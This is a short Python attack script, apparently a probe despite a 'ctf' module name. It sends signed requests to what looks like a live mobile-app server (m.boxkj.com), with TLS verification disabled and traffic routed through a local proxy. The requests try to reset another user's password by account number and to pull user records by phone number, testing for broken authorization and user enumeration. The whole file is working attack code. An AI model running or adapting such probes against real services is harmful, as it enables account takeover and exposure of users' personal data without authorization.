import sys, json, ssl, urllib.request, urllib.parse
sys.path.insert(0,'/Users/mac/Desktop')
from tsn_ctf_probe import build_signed, form_body, base_headers

ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.ProxyHandler({'http':'http://127.0.0.1:7897','https':'http://127.0.0.1:7897'}), urllib.request.HTTPSHandler(context=ctx))

def post(path, params, host='https://m.boxkj.com'):
    body,concat,sign = build_signed(params)
    req=urllib.request.Request(host+path, data=form_body(body), headers=base_headers(), method='POST')
    try:
        with opener.open(req, timeout=15) as r:
            data=r.read(4000)
            try: data=data.decode('utf-8')
            except: pass
            print(f'[{path}] HTTP {r.status}: {str(data)[:800]}')
    except urllib.error.HTTPError as e:
        print(f'[{path}] HTTP {e.code}: {e.read(800).decode("utf-8","replace")}')
    except Exception as e:
        print(f'[{path}] ERR {e}')

post('/app/changeUserPassword', {'userNum':'zzz_test_999','pwd':'Test123456'})
post('/app/getUserInfoByTel', {'phone':'13800000000'})
post('/app/getUserInfoCountByTel', {'phone':'13800000000'})
